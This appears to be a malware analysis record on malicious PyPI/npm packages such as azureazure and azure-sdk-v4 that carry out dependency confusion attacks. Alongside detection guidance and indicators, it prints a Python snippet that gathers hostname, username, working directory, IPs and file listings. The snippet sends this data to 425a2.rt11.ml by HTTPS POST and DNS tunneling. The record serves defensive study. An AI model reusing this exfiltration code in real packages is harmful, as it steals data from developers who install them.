package_info.package_name: azureazure, azure-sdk-v4, glints-sdk, azure-sdk-v3 (and others, see list)
package_info.why_malicious: These packages perform dependency confusion attacks, exfiltrating sensitive system and user information to attacker-controlled endpoints using legitimate SaaS webhook services. They collect host details, enumerate files, and send data via HTTPS POST and DNS tunneling, often using obfuscation to evade detection.

malicious_snippets.code_behavior: At import-time, the code collects system and user information (home directory, hostname, username, DNS servers, external IP, file listings) and exfiltrates it via HTTPS POST to 425a2.rt11.ml.

malice_analysis.why_suspicious: Collecting and exfiltrating detailed host and user information to an external domain is a classic sign of reconnaissance and data theft.
malice_analysis.violated_expectations: Legitimate packages should not collect or transmit host/user data without user consent, especially not to untrusted domains.
malice_analysis.similar_legitimate_use: Telemetry or crash reporting (with user consent and to trusted vendor endpoints).
key_indicators: Exfiltration of sensitive data to hardcoded external domain
Enumeration of files in sensitive directories
Collection of network and user information

malicious_snippets.code_behavior: At import-time, the obfuscated code performs the same data collection and exfiltration as snippet_1, but uses code obfuscation to evade static analysis.

malice_analysis.why_suspicious: Obfuscation is commonly used to hide malicious intent and evade detection by both humans and automated tools.
malice_analysis.violated_expectations: Legitimate packages rarely obfuscate code unless for proprietary logic, not for basic telemetry.
malice_analysis.similar_legitimate_use: Obfuscation for commercial intellectual property protection (rare in open source).
key_indicators: Same network exfiltration behavior as unobfuscated variant

        cwd = os.getcwd()
        username = getpass.getuser()
        try:
            dn = ""

            un = username.encode().hex()
            pn = pname.encode().hex()
            ip = getIps()
            dn = hn+"."+pn+"."+un+".p"
            cs = cwd.split('/')
            for i in range(len(cs)):
                cs[i] = cs[i].encode().hex()
            path = ""
            for c in cs:
                if c != "" and c != None:
                    path = path+"."+c
            path = path.strip('.')
            dn = dn+"."+path+".p"

            dn = dn+".425a2.rt11.ml"
            socket.gethostbyname(dn)
        except Exception as e:

        ploads = {"msg":json.dumps({'hostname':hostname,'package':pname,'cwd':cwd,'username':username,"ipaddresses":json.dumps(gethttpips()),"dirs":json.dumps(getFiles(["c:","d:","/","/home"]))})}
        requests.post("https://425a2.rt11.ml",data = ploads)
malicious_snippets.code_behavior: During installation, the code collects system and user information, exfiltrates it via HTTPS POST to 425a2.rt11.ml, and also encodes data into a DNS query for exfiltration via DNS tunneling.

malice_analysis.why_suspicious: Dual exfiltration via HTTPS and DNS tunneling is highly suspicious and characteristic of advanced data theft.
malice_analysis.violated_expectations: Setup scripts should not perform network communication or exfiltrate host/user data.
malice_analysis.similar_legitimate_use: None; DNS tunneling for telemetry is not standard practice.
key_indicators: Sensitive data sent to hardcoded external domain

attack_chain.action: Malicious package is installed via dependency confusion (npm or PyPI).
attack_chain.leads_to: Execution of malicious code at install/import time.

attack_chain.action: Malicious code collects sensitive system, user, and network information, including file listings.
Exfiltration of collected data to attacker-controlled endpoints via HTTPS POST and/or DNS tunneling.
attack_chain.leads_to: Attacker receives sensitive data; possible further exploitation.

behavioral_signatures: Collection of system/user/network information at install/import time
Enumeration of files in root or user directories
Network requests to known webhook or C2 domains during install/import
Obfuscated code in package entry points
DNS queries with encoded host/user/package data
file_indicators: index.js with system info collection and network exfiltration
setup.py or custom install class with network/DNS exfiltration
Obfuscated JavaScript in main entry point
detection_knowledge.how_to_detect: Monitor for packages that collect and transmit host/user/network information at install/import time, especially to known webhook/C2 domains. Flag obfuscated code in entry points. Detect DNS queries with encoded data to suspicious domains. Correlate package names and versions with known IOCs and block or alert on network traffic to listed endpoints.
